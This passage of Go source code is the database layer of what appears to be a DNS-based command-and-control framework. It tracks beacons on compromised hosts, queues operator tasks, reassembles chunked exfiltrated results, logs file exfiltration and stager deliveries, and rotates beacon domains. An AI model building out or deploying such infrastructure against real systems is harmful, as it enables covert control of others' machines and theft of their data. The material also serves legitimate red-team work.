			WHERE bdc.beacon_id = ?
		`, beaconID, now, beaconID)
	}


	rows, err := d.db.Query(`SELECT domain, active FROM beacon_domains WHERE beacon_id = ? ORDER BY domain`, beaconID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var domains []BeaconDomain
	for rows.Next() {
		var domain string
		var active int
		if err := rows.Scan(&domain, &active); err != nil {
			continue
		}
		domains = append(domains, BeaconDomain{
			Domain: domain,
			Active: active == 1,
		})
	}
	return domains, nil
}

// SetBeaconDomainActive toggles a domain's active status. Prevents deactivating the last active domain.
func (d *MasterDatabase) SetBeaconDomainActive(beaconID, domain string, active bool) error {

	tx, err := d.db.Begin()
	if err != nil {
		return fmt.Errorf("failed to begin transaction: %w", err)
	}
	defer tx.Rollback()

	if !active {
		var activeCount int
		if err := tx.QueryRow(`SELECT COUNT(*) FROM beacon_domains WHERE beacon_id = ? AND active = 1`, beaconID).Scan(&activeCount); err != nil {
			return fmt.Errorf("failed to check active domain count: %w", err)
		}
		if activeCount <= 1 {
			return fmt.Errorf("cannot deactivate last active domain — beacon would be unreachable")
		}
	}

	activeInt := 0
	if active {
		activeInt = 1
	}
	result, err := tx.Exec(`UPDATE beacon_domains SET active = ? WHERE beacon_id = ? AND domain = ?`, activeInt, beaconID, domain)
	if err != nil {
		return err
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		return fmt.Errorf("domain %s not found for beacon %s", domain, beaconID)
	}
	return tx.Commit()
}

// AddBeaconDomain adds a new domain to a beacon's domain list.
func (d *MasterDatabase) AddBeaconDomain(beaconID, domain string) error {

	_, err := d.db.Exec(`
		INSERT OR IGNORE INTO beacon_domains (beacon_id, domain, active, added_at)
		VALUES (?, ?, 1, ?)
	`, beaconID, domain, time.Now().Unix())
	return err
}

// GetActiveBeaconDomains returns only active domain strings for update_domains commands.
func (d *MasterDatabase) GetActiveBeaconDomains(beaconID string) ([]string, error) {

	rows, err := d.db.Query(`SELECT domain FROM beacon_domains WHERE beacon_id = ? AND active = 1 ORDER BY domain`, beaconID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var domains []string
	for rows.Next() {
		var domain string
		if err := rows.Scan(&domain); err != nil {
			continue
		}
		domains = append(domains, domain)
	}
	return domains, nil
}

// SHADOW MESH FIX: Return status changes for ALL tasks, not just those assigned to this server.
// Uses per-DNS-server sync tracking so every server gets every status update independently.
func (d *MasterDatabase) GetCompletedTasksForSync(dnsServerID string) ([]CompletedTaskSync, error) {

	// Per-DNS-server sync: LEFT JOIN against dns_server_task_sync to find tasks
	// this specific DNS server hasn't seen yet, or that have been updated since last sync.
	rows, err := d.db.Query(`
		SELECT t.id, t.beacon_id, t.status
		FROM tasks t
		LEFT JOIN dns_server_task_sync s
			ON s.task_id = t.id AND s.dns_server_id = ?
		WHERE t.status != 'pending'
		  AND (s.synced_at IS NULL OR s.synced_at < t.updated_at)
		ORDER BY t.updated_at ASC
		LIMIT 500
	`, dnsServerID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var tasks []CompletedTaskSync
	for rows.Next() {
		var id, beaconID, status string

		if err := rows.Scan(&id, &beaconID, &status); err != nil {
			continue
		}

		tasks = append(tasks, CompletedTaskSync{
			TaskID:   id,
			BeaconID: beaconID,
			Status:   status,
		})
	}

	return tasks, rows.Err()
}

// MarkTasksAsSynced records that a specific DNS server has received these task status updates.
// Uses per-DNS-server tracking so each server syncs independently.
func (d *MasterDatabase) MarkTasksAsSynced(dnsServerID string, taskIDs []string) error {

	if len(taskIDs) == 0 || dnsServerID == "" {
		return nil
	}

	now := time.Now().Unix()
	for _, taskID := range taskIDs {
		_, err := d.db.Exec(`
			INSERT INTO dns_server_task_sync (dns_server_id, task_id, synced_at)
			VALUES (?, ?, ?)
			ON CONFLICT(dns_server_id, task_id) DO UPDATE SET synced_at = ?
		`, dnsServerID, taskID, now, now)
		if err != nil {
			return fmt.Errorf("failed to mark task %s as synced for server %s: %w", taskID, dnsServerID, err)
		}
	}
	return nil
}

// GetAllTasks retrieves all tasks with their status
func (d *MasterDatabase) GetAllTasks(limit int) ([]Task, error) {
	return d.GetAllTasksPaginated(limit, 0)
}

// GetAllTasksPaginated retrieves tasks with pagination support
func (d *MasterDatabase) GetAllTasksPaginated(limit, offset int) ([]Task, error) {

	query := `
		SELECT t.id, t.beacon_id, t.command, t.status, t.created_at, t.completed_at,
		       b.hostname, b.username, b.os
		FROM tasks t
		LEFT JOIN beacons b ON t.beacon_id = b.id
		ORDER BY t.created_at DESC
	`

	if limit > 0 {
		query += fmt.Sprintf(" LIMIT %d", limit)
	}
	if offset > 0 {
		query += fmt.Sprintf(" OFFSET %d", offset)
	}

	rows, err := d.db.Query(query)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var tasks []Task
	for rows.Next() {
		var id, beaconID, command, status string
		var hostname, username, os sql.NullString
		var createdAt int64
		var completedAt sql.NullInt64

		if err := rows.Scan(&id, &beaconID, &command, &status, &createdAt, &completedAt,
			&hostname, &username, &os); err != nil {
			continue
		}

		task := Task{
			ID:        id,
			BeaconID:  beaconID,
			Command:   command,
			Status:    status,
			CreatedAt: time.Unix(createdAt, 0).Format(time.RFC3339),
		}

		if completedAt.Valid {
			task.CompletedAt = time.Unix(completedAt.Int64, 0).Format(time.RFC3339)
		}

		if hostname.Valid {
			task.Hostname = hostname.String
		}
		if username.Valid {
			task.Username = username.String
		}
		if os.Valid {
			task.OS = os.String
		}

		// Add progress for in-progress tasks (sent/exfiltrating)
		if status == "sent" || status == "exfiltrating" {
			progress, err := d.GetTaskProgressFromResults(id)
			if err == nil {
				task.Progress = &progress
			}
		}

		tasks = append(tasks, task)
	}

	return tasks, rows.Err()
}

// CountActiveBeacons returns the total count of active beacons
func (d *MasterDatabase) CountActiveBeacons(minutesThreshold int) (int, error) {

	threshold := time.Now().Add(-time.Duration(minutesThreshold) * time.Minute).Unix()

	var count int
	err := d.db.QueryRow(`
		SELECT COUNT(*) 
		FROM beacons 
		WHERE last_seen >= ? AND status = 'active'
	`, threshold).Scan(&count)

	return count, err
}

// CountAllTasks returns the total count of tasks
func (d *MasterDatabase) CountAllTasks() (int, error) {

	var count int
	err := d.db.QueryRow("SELECT COUNT(*) FROM tasks").Scan(&count)
	return count, err
}

// GetTaskWithResult retrieves a task and its result if completed
func (d *MasterDatabase) GetTaskWithResult(taskID string) (Task, error) {

	var id, beaconID, command, status string
	var createdBy sql.NullString
	var createdAt, sentAt, completedAt sql.NullInt64

	err := d.db.QueryRow(`
		SELECT id, beacon_id, command, status, created_by, created_at, sent_at, completed_at
		FROM tasks
		WHERE id = ?
	`, taskID).Scan(&id, &beaconID, &command, &status, &createdBy, &createdAt, &sentAt, &completedAt)

	if err != nil {
		if err == sql.ErrNoRows {
			return Task{}, fmt.Errorf("task not found")
		}
		return Task{}, err
	}

	task := Task{
		ID:       id,
		BeaconID: beaconID,
		Command:  command,
		Status:   status,
	}

	if createdBy.Valid {
		task.CreatedBy = createdBy.String
	}
	if createdAt.Valid {
		task.CreatedAt = time.Unix(createdAt.Int64, 0).Format(time.RFC3339)
	}
	if sentAt.Valid {
		task.SentAt = time.Unix(sentAt.Int64, 0).Format(time.RFC3339)
	}
	if completedAt.Valid {
		task.CompletedAt = time.Unix(completedAt.Int64, 0).Format(time.RFC3339)
	}

	// Get result if task is completed
	if status == "completed" {
		result, isComplete, err := d.GetTaskResult(taskID)
		if err == nil && isComplete {
			task.Result = result
			task.ResultSize = len(result)
		} else if !isComplete {
			// Task marked completed but no assembled result — try on-the-fly reassembly
			var chunkCount int
			var totalChunks int
			d.db.QueryRow(`SELECT COUNT(DISTINCT chunk_index), COALESCE(MAX(total_chunks),0) FROM task_results WHERE task_id = ? AND chunk_index > 0`, taskID).Scan(&chunkCount, &totalChunks)
			if totalChunks > 0 && chunkCount >= totalChunks {
				var beaconID string
				d.db.QueryRow(`SELECT beacon_id FROM task_results WHERE task_id = ? LIMIT 1`, taskID).Scan(&beaconID)
				go d.reassembleChunkedResult(taskID, beaconID, totalChunks)
			}
		}
	} else if status == "sent" || status == "exfiltrating" {
		// Task is in progress, calculate progress from actual received chunks
		progress, err := d.GetTaskProgressFromResults(taskID)
		if err == nil {
			task.Progress = &progress
		}
	}

	return task, nil
}

// MarkTasksSent marks tasks as 'sent' after they are retrieved by a DNS server
func (d *MasterDatabase) MarkTasksSent(taskIDs []string) error {
	if len(taskIDs) == 0 {
		return nil
	}


	now := time.Now().Unix()

	// Build placeholders for SQL IN clause
	placeholders := make([]string, len(taskIDs))
	args := make([]interface{}, len(taskIDs)+1)
	args[0] = now

	for i, taskID := range taskIDs {
		placeholders[i] = "?"
		args[i+1] = taskID
	}

	query := fmt.Sprintf(`
		UPDATE tasks 
		SET status = 'sent', sent_at = ?
		WHERE id IN (%s) AND status = 'pending'
	`, strings.Join(placeholders, ","))

	_, err := d.db.Exec(query, args...)
	return err
}

// UpdateTaskProgress updates or creates task progress from a DNS server
func (d *MasterDatabase) UpdateTaskProgress(taskID, beaconID, dnsServerID string, receivedChunks, totalChunks int, status string) error {

	now := time.Now().Unix()

	_, err := d.db.Exec(`
		INSERT INTO task_progress (task_id, beacon_id, dns_server_id, received_chunks, total_chunks, status, last_updated)
		VALUES (?, ?, ?, ?, ?, ?, ?)
		ON CONFLICT(task_id, dns_server_id) 
		DO UPDATE SET 
			received_chunks = excluded.received_chunks,
			total_chunks = excluded.total_chunks,
			status = excluded.status,
			last_updated = excluded.last_updated
	`, taskID, beaconID, dnsServerID, receivedChunks, totalChunks, status, now)

	return err
}

// GetTaskProgress retrieves aggregated progress for a task across all DNS servers
// NOTE: This function is kept for DNS server progress reporting but is not used
// for operator-facing progress display. Use GetTaskProgressFromResults instead.
func (d *MasterDatabase) GetTaskProgress(taskID string) (TaskProgress, error) {

	// Get overall progress - sum all received chunks from different servers
	var totalReceived, totalExpected int
	var status string

	err := d.db.QueryRow(`
		SELECT
			COALESCE(SUM(received_chunks), 0) as total_received,
			MAX(total_chunks) as total_expected,
			CASE
				WHEN MAX(status) = 'complete' THEN 'complete'
				WHEN MAX(status) = 'assembling' THEN 'assembling'
				WHEN SUM(received_chunks) > 0 THEN 'receiving'
				ELSE 'pending'
			END as overall_status
		FROM task_progress
		WHERE task_id = ?
	`, taskID).Scan(&totalReceived, &totalExpected, &status)

	if err == sql.ErrNoRows {
		return TaskProgress{
			TaskID:         taskID,
			ReceivedChunks: 0,
			TotalChunks:    0,
			Progress:       0,
			Status:         "pending",
		}, nil
	}
	if err != nil {
		return TaskProgress{}, err
	}

	progress := 0
	if totalExpected > 0 {
		progress = (totalReceived * 100) / totalExpected
		if progress > 100 {
			progress = 100 // Cap at 100% in case of duplicates
		}
	}

	return TaskProgress{
		TaskID:         taskID,
		ReceivedChunks: totalReceived,
		TotalChunks:    totalExpected,
		Progress:       progress,
		Status:         status,
	}, nil
}

// GetTaskProgressFromResults calculates actual progress from task_results table
// This is the authoritative source for progress as it reflects what the Master has received
// With distributed chunks, this aggregates data from all DNS servers
func (d *MasterDatabase) GetTaskProgressFromResults(taskID string) (TaskProgress, error) {
	// First check if we have a complete result
	var completeExists int
	err := d.db.QueryRow(`
		SELECT COUNT(*) FROM task_results
		WHERE task_id = ? AND chunk_index = 0 AND is_complete = 1
	`, taskID).Scan(&completeExists)

	if err != nil {
		return TaskProgress{}, err
	}

	if completeExists > 0 {
		// Task is complete
		return TaskProgress{
			TaskID:         taskID,
			ReceivedChunks: -1, // Not applicable for complete
			TotalChunks:    -1,
			Progress:       100,
			Status:         "complete",
		}, nil
	}

	// Get total expected chunks from task_results (RESULT_META chunk or max total_chunks)
	// NOTE: Changed from total_chunks > 1 to total_chunks > 0 to include single-chunk results
	var totalExpected sql.NullInt64
	err = d.db.QueryRow(`
		SELECT MAX(total_chunks) FROM task_results
		WHERE task_id = ? AND total_chunks > 0
		LIMIT 1
	`, taskID).Scan(&totalExpected)

	if err != nil && err != sql.ErrNoRows {
		return TaskProgress{}, err
	}

	// If no metadata in task_results yet, try DNS server progress reports
	if !totalExpected.Valid || totalExpected.Int64 <= 0 {
		var progressTotal sql.NullInt64
		err = d.db.QueryRow(`
			SELECT MAX(total_chunks) FROM task_progress
			WHERE task_id = ? AND total_chunks > 0
		`, taskID).Scan(&progressTotal)

		if err == nil && progressTotal.Valid && progressTotal.Int64 > 0 {
			totalExpected = progressTotal
		}
	}

	if !totalExpected.Valid || totalExpected.Int64 <= 0 {
		// No chunks received yet or single-chunk result
		return TaskProgress{
			TaskID:         taskID,
			ReceivedChunks: 0,
			TotalChunks:    0,
			Progress:       0,
			Status:         "pending",
		}, nil
	}

	// Count unique chunks received (excluding metadata chunk at index 0)
	var receivedChunks int
	err = d.db.QueryRow(`
		SELECT COUNT(DISTINCT chunk_index) FROM task_results
		WHERE task_id = ? AND chunk_index > 0
	`, taskID).Scan(&receivedChunks)

	if err != nil {
		return TaskProgress{}, err
	}

	progress := 0
	if totalExpected.Int64 > 0 {
		progress = int((int64(receivedChunks) * 100) / totalExpected.Int64)
		if progress > 100 {
			progress = 100
		}
	}

	status := "receiving"
	if receivedChunks == 0 {
		status = "pending"
	} else if receivedChunks >= int(totalExpected.Int64) {
		status = "assembling"
	}

	return TaskProgress{
		TaskID:         taskID,
		ReceivedChunks: receivedChunks,
		TotalChunks:    int(totalExpected.Int64),
		Progress:       progress,
		Status:         status,
	}, nil
}

// markTaskCompleted updates a task's status to 'completed'
// This is called internally (mutex already held by caller)
func (d *MasterDatabase) markTaskCompleted(taskID string) {
	now := time.Now().Unix()
	result, err := d.db.Exec(`
		UPDATE tasks 
		SET status = 'completed', completed_at = ?, updated_at = ?
		WHERE id = ? AND status != 'completed'
	`, now, now, taskID)

	if err != nil {
		dbLogAlways("Error marking task %s as completed: %v\n", taskID, err)
		return
	}

	rowsAffected, _ := result.RowsAffected()
	if rowsAffected == 0 {
		// Don't log warnings for D tasks (discovery tasks may not exist in tasks table)
		if !strings.HasPrefix(taskID, "D") {
			dbLog("Task %s was already completed or doesn't exist\n", taskID)
		}
	} else {
		// Only log completion for non-discovery tasks
		if !strings.HasPrefix(taskID, "D") {
			dbLogAlways("Task %s marked as completed\n", taskID)
		}
	}
}

// MarkTaskCompleteFromBeacon is called when DNS server receives RESULT_COMPLETE message
// This signals that the beacon has finished sending all chunks successfully
// For multi-chunk results, this triggers final reassembly if not already done
func (d *MasterDatabase) MarkTaskCompleteFromBeacon(taskID, beaconID string, totalChunks int) error {

	// Check current task status and metadata
	var status string
	var resultSize, chunkCount int
	err := d.db.QueryRow(`
		SELECT status, COALESCE(result_size, 0), COALESCE(chunk_count, 0) FROM tasks WHERE id = ?
	`, taskID).Scan(&status, &resultSize, &chunkCount)

	if err != nil {
		return fmt.Errorf("task not found: %w", err)
	}

	// Use chunkCount from task metadata if totalChunks wasn't provided
	if totalChunks == 0 && chunkCount > 0 {
		totalChunks = chunkCount
		dbLog("Using chunk_count=%d from task metadata for task %s\n", totalChunks, taskID)
	}

	// If still 0, try to count actual chunks in task_results
	if totalChunks == 0 {
		var maxTotalChunks sql.NullInt64
		err = d.db.QueryRow(`
			SELECT MAX(total_chunks) FROM task_results WHERE task_id = ? AND total_chunks > 0
		`, taskID).Scan(&maxTotalChunks)
		if err == nil && maxTotalChunks.Valid && maxTotalChunks.Int64 > 0 {
			totalChunks = int(maxTotalChunks.Int64)
			dbLog("Using total_chunks=%d from task_results for task %s\n", totalChunks, taskID)
		}
	}

	dbLog("RESULT_COMPLETE for task %s (status=%s, totalChunks=%d, storedSize=%d)\n", taskID, status, totalChunks, resultSize)

	// If already completed, nothing to do
	if status == "completed" {
		dbLog("Task %s already completed, ignoring duplicate RESULT_COMPLETE\n", taskID)
		d.clearPendingCompletion(taskID)
		return nil
	}

	// Fire-and-forget tasks (e.g. update_domains): no result data expected.
	// Mark complete immediately without looking for chunks.
	if totalChunks == 0 && resultSize == 0 && chunkCount == 0 {
		dbLog("Task %s has no result data expected (fire-and-forget), marking complete\n", taskID)
		d.markTaskCompleted(taskID)
		d.clearPendingCompletion(taskID)
		return nil
	}

	// If status is "exfiltrating" and result_size > 0, result is already in task_results, just mark complete
	if status == "exfiltrating" && resultSize > 0 {
		dbLog("Task %s has result in task_results (%d bytes), marking complete\n", taskID, resultSize)
		d.markTaskCompleted(taskID)
		d.clearPendingCompletion(taskID)
		return nil
	}

	// If multi-chunk result, check if all chunks present and trigger reassembly
	if totalChunks > 1 {
		var receivedChunks int
		err = d.db.QueryRow(`
			SELECT COUNT(*) FROM task_results
			WHERE task_id = ? AND chunk_index > 0
		`, taskID).Scan(&receivedChunks)

		if err != nil {
			return fmt.Errorf("failed to count chunks: %w", err)
		}

		dbLog("Task %s has %d/%d chunks\n", taskID, receivedChunks, totalChunks)

		if receivedChunks == totalChunks {
			// All chunks present, trigger reassembly synchronously (we already have the mutex)
			dbLog("All chunks present for task %s, assembling result\n", taskID)

			// Check if we already have an assembled result (from another DNS server's completion signal)
			var existingResultID int
			err = d.db.QueryRow(`
				SELECT id FROM task_results 
				WHERE task_id = ? AND chunk_index = 0 AND is_complete = 1
				LIMIT 1
			`, taskID).Scan(&existingResultID)

			if err == nil {
				// Already assembled - just mark task complete if not already
				dbLog("Task %s already has assembled result (id=%d), marking complete\n", taskID, existingResultID)
				d.markTaskCompleted(taskID)
				d.clearPendingCompletion(taskID)
				return nil
			}

			// Fetch all chunks in order
			rows, err := d.db.Query(`
				SELECT result_data FROM task_results 
				WHERE task_id = ? AND chunk_index > 0 
				ORDER BY chunk_index ASC
			`, taskID)

			if err != nil {
				return fmt.Errorf("failed to fetch chunks: %w", err)
			}
			defer rows.Close()

			var chunks []string
			for rows.Next() {
				var chunk string
				if err := rows.Scan(&chunk); err != nil {
					return fmt.Errorf("failed to scan chunk: %w", err)
				}
				chunks = append(chunks, chunk)
			}

			if len(chunks) != totalChunks {
				return fmt.Errorf("chunk count mismatch: expected %d, got %d", totalChunks, len(chunks))
			}

			// Assemble result
			assembledResult := strings.Join(chunks, "")

			// Store assembled result (chunkIndex=0 indicates final assembled result)
			// Use INSERT OR REPLACE to handle race conditions from multiple DNS servers
			_, err = d.db.Exec(`
				INSERT OR REPLACE INTO task_results (task_id, beacon_id, dns_server_id, result_data, received_at, chunk_index, total_chunks, is_complete)
				VALUES (?, ?, 'master-assembled', ?, ?, 0, ?, 1)
			`, taskID, beaconID, assembledResult, time.Now().Unix(), totalChunks)

			if err != nil {
				return fmt.Errorf("failed to store assembled result: %w", err)
			}

			// Mark task as complete (result is in task_results table)
			now := time.Now().Unix()
			_, err = d.db.Exec(`
				UPDATE tasks 
				SET status = 'completed', completed_at = ?, updated_at = ?, result_size = ?, chunk_count = ?
				WHERE id = ?
			`, now, now, len(assembledResult), totalChunks, taskID)

			if err != nil {
				return fmt.Errorf("failed to update task: %w", err)
			}

			dbLogAlways("Task %s assembled and marked as completed (%d bytes)\n", taskID, len(assembledResult))
			d.clearPendingCompletion(taskID)
		} else {
			dbLog("Waiting for remaining chunks for task %s (%d/%d received)\n", taskID, receivedChunks, totalChunks)
			// Record pending completion so chunks arriving later can trigger reassembly
			d.recordPendingCompletion(taskID, beaconID, totalChunks)
			return nil
		}
	} else {
		// Single-chunk result: verify it exists in task_results, then mark task complete
		dbLog("Single-chunk result for task %s, verifying result exists\n", taskID)

		var resultSize int
		err = d.db.QueryRow(`
			SELECT LENGTH(result_data) FROM task_results
			WHERE task_id = ? AND chunk_index = 1 AND total_chunks = 1
			LIMIT 1
		`, taskID).Scan(&resultSize)

		if err != nil {
			// SHADOW MESH: If result not found with total_chunks=1, check if it exists with total_chunks=0
			// This happens when DNS server didn't receive RESULT_META and didn't know it was single-chunk
			if err == sql.ErrNoRows {
				var resultSizeZero int
				err2 := d.db.QueryRow(`
					SELECT LENGTH(result_data) FROM task_results
					WHERE task_id = ? AND chunk_index = 1 AND total_chunks = 0
					LIMIT 1
				`, taskID).Scan(&resultSizeZero)

				if err2 == nil {
					// Found chunk with total_chunks=0, update it to total_chunks=1
					dbLog("Found chunk with total_chunks=0, updating to total_chunks=1\n")
					_, updateErr := d.db.Exec(`
						UPDATE task_results 
						SET total_chunks = 1, is_complete = 1
						WHERE task_id = ? AND chunk_index = 1 AND total_chunks = 0
					`, taskID)

					if updateErr != nil {
						return fmt.Errorf("failed to update chunk total_chunks: %w", updateErr)
					}

					resultSize = resultSizeZero
				} else {
					// No chunk found at all - data coming from different DNS server
					dbLog("Task %s completion received but no result data yet (mesh routing - data coming from different DNS server)\n", taskID)
					// Leave task in "exfiltrating" status - will be completed when data arrives
					d.recordPendingCompletion(taskID, beaconID, totalChunks)
					return nil
				}
			} else {
				return fmt.Errorf("failed to verify single-chunk result: %w", err)
			}
		}

		// Mark task as complete (result is in task_results table)
		now := time.Now().Unix()
		_, err = d.db.Exec(`
			UPDATE tasks 
			SET status = 'completed', completed_at = ?, updated_at = ?, result_size = ?, chunk_count = 1
			WHERE id = ?
		`, now, now, resultSize, taskID)

		if err != nil {
			return fmt.Errorf("failed to update task status: %w", err)
		}

		dbLogAlways("Task %s marked as completed (%d bytes)\n", taskID, resultSize)
		d.clearPendingCompletion(taskID)
	}

	return nil
}

// LogAuditEvent logs an operator action to the audit log
func (d *MasterDatabase) LogAuditEvent(operatorID, action, targetType, targetID, details, ipAddress string) error {

	_, err := d.db.Exec(`
		INSERT INTO audit_log (operator_id, action, target_type, target_id, details, ip_address, timestamp)
		VALUES (?, ?, ?, ?, ?, ?, ?)
	`, operatorID, action, targetType, targetID, details, ipAddress, time.Now().Unix())

	return err
}

// GetDatabaseStats returns master database statistics
func (d *MasterDatabase) GetDatabaseStats() (DatabaseStats, error) {

	var stats DatabaseStats

	// Count DNS servers
	if err := d.db.QueryRow("SELECT COUNT(*) FROM dns_servers").Scan(&stats.DNSServers); err != nil {
		stats.DNSServers = 0
	}
	if err := d.db.QueryRow("SELECT COUNT(*) FROM dns_servers WHERE status = 'active'").Scan(&stats.ActiveDNSServers); err != nil {
		stats.ActiveDNSServers = 0
	}

	// Count beacons
	if err := d.db.QueryRow("SELECT COUNT(*) FROM beacons").Scan(&stats.Beacons); err != nil {
		stats.Beacons = 0
	}
	cutoff := time.Now().Add(-24 * time.Hour).Unix()
	if err := d.db.QueryRow("SELECT COUNT(*) FROM beacons WHERE last_seen > ? AND status = 'active'", cutoff).Scan(&stats.ActiveBeacons); err != nil {
		stats.ActiveBeacons = 0
	}

	// Count tasks
	if err := d.db.QueryRow("SELECT COUNT(*) FROM tasks").Scan(&stats.Tasks); err != nil {
		stats.Tasks = 0
	}

	// Tasks by status
	rows, err := d.db.Query("SELECT status, COUNT(*) FROM tasks GROUP BY status")
	if err == nil {
		defer rows.Close()
		tasksByStatus := make(map[string]int)
		for rows.Next() {
			var status string
			var count int
			if err := rows.Scan(&status, &count); err == nil {
				tasksByStatus[status] = count
			}
		}
		stats.TasksByStatus = tasksByStatus
	}

	// Count operators
	if err := d.db.QueryRow("SELECT COUNT(*) FROM operators WHERE is_active = 1").Scan(&stats.Operators); err != nil {
		stats.Operators = 0
	}

	// Recent audit events
	if err := d.db.QueryRow("SELECT COUNT(*) FROM audit_log WHERE timestamp > ?", cutoff).Scan(&stats.RecentAuditEvents); err != nil {
		stats.RecentAuditEvents = 0
	}

	// Count stager sessions
	if err := d.db.QueryRow("SELECT COUNT(*) FROM stager_sessions").Scan(&stats.StagerSessions); err != nil {
		stats.StagerSessions = 0
	}
	if err := d.db.QueryRow("SELECT COUNT(*) FROM stager_sessions WHERE completed = 1").Scan(&stats.CompletedStagerSessions); err != nil {
		stats.CompletedStagerSessions = 0
	}

	// Count exfil transfers
	if err := d.db.QueryRow("SELECT COUNT(*) FROM exfil_transfers").Scan(&stats.ExfilTransfers); err != nil {
		stats.ExfilTransfers = 0
	}
	if err := d.db.QueryRow("SELECT COUNT(*) FROM exfil_transfers WHERE status = 'complete'").Scan(&stats.CompletedExfilTransfers); err != nil {
		stats.CompletedExfilTransfers = 0
	}

	return stats, nil
}

// TimelineEvent represents a single event in the operation timeline
type TimelineEvent struct {
	Timestamp   int64  `json:"timestamp"`
	EventType   string `json:"event_type"`
	Category    string `json:"category"`
	Title       string `json:"title"`
	Description string `json:"description"`
	TargetID    string `json:"target_id,omitempty"`
	Status      string `json:"status,omitempty"`
}

// GetTimeline returns a chronological list of operation events
func (d *MasterDatabase) GetTimeline(limit int) ([]TimelineEvent, error) {

	if limit <= 0 {
		limit = 100
	}

	var events []TimelineEvent

	// Get beacon registrations
	rows, err := d.db.Query(`
		SELECT id, hostname, username, os, created_at
		FROM beacons
		ORDER BY created_at DESC
		LIMIT ?
	`, limit)
	if err == nil {
		defer rows.Close()
		for rows.Next() {
			var id, hostname, username, os string
			var createdAt int64
			if err := rows.Scan(&id, &hostname, &username, &os, &createdAt); err == nil {
				events = append(events, TimelineEvent{
					Timestamp:   createdAt,
					EventType:   "beacon_registered",
					Category:    "beacon",
					Title:       "Beacon Registered",
					Description: fmt.Sprintf("%s@%s (%s)", username, hostname, os),
					TargetID:    id,
					Status:      "success",
				})
			}
		}
	}

	// Get task events (created and completed)
	rows2, err := d.db.Query(`
		SELECT t.id, t.beacon_id, t.command, t.status, t.created_at, t.completed_at,
		       COALESCE(b.hostname, 'unknown') as hostname
		FROM tasks t
		LEFT JOIN beacons b ON t.beacon_id = b.id
		ORDER BY t.created_at DESC
		LIMIT ?
	`, limit)
	if err == nil {
		defer rows2.Close()
		for rows2.Next() {
			var id, beaconID, command, status, hostname string
			var createdAt int64
			var completedAt sql.NullInt64
			if err := rows2.Scan(&id, &beaconID, &command, &status, &createdAt, &completedAt, &hostname); err == nil {
				// Truncate command for display
				cmdPreview := command
				if len(cmdPreview) > 50 {
					cmdPreview = cmdPreview[:47] + "..."
				}

				// Task created event
				events = append(events, TimelineEvent{
					Timestamp:   createdAt,
					EventType:   "task_created",
					Category:    "task",
					Title:       "Task Created",
					Description: fmt.Sprintf("[%s] %s", hostname, cmdPreview),
					TargetID:    id,
					Status:      "pending",
				})

				// Task completed event (if completed)
				if completedAt.Valid && completedAt.Int64 > 0 {
					events = append(events, TimelineEvent{
						Timestamp:   completedAt.Int64,
						EventType:   "task_completed",
						Category:    "task",
						Title:       "Task Completed",
						Description: fmt.Sprintf("[%s] %s", hostname, cmdPreview),
						TargetID:    id,
						Status:      status,
					})
				}
			}
		}
	}

	// Get exfil transfer events
	rows3, err := d.db.Query(`
		SELECT session_id, file_name, file_size, status, created_at, completed_at
		FROM exfil_transfers
		ORDER BY created_at DESC
		LIMIT ?
	`, limit)
	if err == nil {
		defer rows3.Close()
		for rows3.Next() {
			var sessionID, fileName, status string
			var fileSize int64
			var createdAt int64
			var completedAt sql.NullInt64
			if err := rows3.Scan(&sessionID, &fileName, &fileSize, &status, &createdAt, &completedAt); err == nil {
				// Exfil started event
				events = append(events, TimelineEvent{
					Timestamp:   createdAt,
					EventType:   "exfil_started",
					Category:    "exfil",
					Title:       "Exfil Started",
					Description: fmt.Sprintf("%s (%s)", fileName, formatBytes(fileSize)),
					TargetID:    sessionID,
					Status:      "receiving",
				})

				// Exfil completed event (if completed)
				if completedAt.Valid && completedAt.Int64 > 0 {
					events = append(events, TimelineEvent{
						Timestamp:   completedAt.Int64,
						EventType:   "exfil_completed",
						Category:    "exfil",
						Title:       "Exfil Completed",
						Description: fmt.Sprintf("%s (%s)", fileName, formatBytes(fileSize)),
						TargetID:    sessionID,
						Status:      status,
					})
				}
			}
		}
	}

	// Get stager session events
	rows4, err := d.db.Query(`
		SELECT id, stager_ip, os, arch, created_at, completed_at, completed
		FROM stager_sessions
		ORDER BY created_at DESC
		LIMIT ?
	`, limit)
	if err == nil {
		defer rows4.Close()
		for rows4.Next() {
			var id, stagerIP, os, arch string
			var createdAt int64
			var completedAt sql.NullInt64
			var completed bool
			if err := rows4.Scan(&id, &stagerIP, &os, &arch, &createdAt, &completedAt, &completed); err == nil {
				// Stager started event
				events = append(events, TimelineEvent{
					Timestamp:   createdAt,
					EventType:   "stager_started",
					Category:    "stager",
					Title:       "Stager Session Started",
					Description: fmt.Sprintf("%s (%s/%s)", stagerIP, os, arch),
					TargetID:    id,
					Status:      "receiving",
				})

				// Stager completed event (if completed)
				if completed && completedAt.Valid && completedAt.Int64 > 0 {
					events = append(events, TimelineEvent{
						Timestamp:   completedAt.Int64,
						EventType:   "stager_completed",
						Category:    "stager",
						Title:       "Stager Delivered",
						Description: fmt.Sprintf("%s (%s/%s)", stagerIP, os, arch),
						TargetID:    id,
						Status:      "completed",
					})
				}
			}
		}
	}

	// Sort all events by timestamp descending
	sort.Slice(events, func(i, j int) bool {
		return events[i].Timestamp > events[j].Timestamp
	})

	// Limit total events returned
	if len(events) > limit {
		events = events[:limit]
	}

	return events, nil
}

// formatBytes converts bytes to human readable format
func formatBytes(bytes int64) string {
	const unit = 1024
	if bytes < unit {
		return fmt.Sprintf("%d B", bytes)
	}
	div, exp := int64(unit), 0
	for n := bytes / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(bytes)/float64(div), "KMGTPE"[exp])
}

// Stager Cache Management

// QueueStagerCacheForDNSServers queues a client binary to be cached by all active DNS servers
func (d *MasterDatabase) QueueStagerCacheForDNSServers(clientBinaryID string, dnsServerIDs []string) error {

	now := time.Now().Unix()
	successCount := 0

	for _, serverID := range dnsServerIDs {
		_, err := d.db.Exec(`
			INSERT INTO pending_stager_caches (dns_server_id, client_binary_id, created_at, delivered)
			VALUES (?, ?, ?, 0)
		`, serverID, clientBinaryID, now)

		if err != nil {
			// Log but continue - don't let one failed server prevent caching to others
			fmt.Printf("[DB] Warning: failed to queue cache for server %s: %v (continuing with others)\n", serverID, err)
			continue
		}
		successCount++
	}

